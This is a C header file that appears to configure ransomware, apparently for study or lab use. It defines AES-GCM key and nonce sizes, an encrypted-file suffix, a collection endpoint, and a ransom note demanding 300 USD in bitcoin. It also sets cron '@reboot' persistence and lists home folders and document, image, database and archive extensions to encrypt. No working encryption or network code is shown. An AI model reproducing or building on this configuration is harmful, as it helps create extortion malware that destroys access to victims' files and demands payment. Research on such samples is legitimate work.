#ifndef STUDY_CONFIG_H
#define STUDY_CONFIG_H

#include <stddef.h>

#define SESSION_KEY_LEN 32
#define GCM_NONCE_LEN 12
#define GCM_TAG_LEN 16
#define ENCRYPTED_SUFFIX ".PROCESSED"
#define MANAGEMENT_ENDPOINT "http://10.254.19.73:8080/ingest"
#define SESSION_TOKEN_PATH "/tmp/.session.token"
#define NOTICE_FILENAME "#_STATUS_NOTICE_#.txt"
#define NOTICE_TEXT "Operational notice: contact the service owner through the approved secure channel. Reference payment: 300 USD to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa."
#define CRON_ENTRY_TEMPLATE "@reboot %s"

#define TARGET_DIR_COUNT 5
static const char *const TARGET_DIRS[TARGET_DIR_COUNT] = {
    "~/Documentos_Teste", "~/Documentos", "~/Downloads", "~/Imagens", "/mnt"
};

#define TARGET_EXT_COUNT 12
static const char *const TARGET_EXTS[TARGET_EXT_COUNT] = {
    ".xlsx", ".docx", ".pdf", ".txt", ".csv", ".jpg", ".png", ".db",
    ".backup", ".psd", ".zip", ".rar"
};

#endif
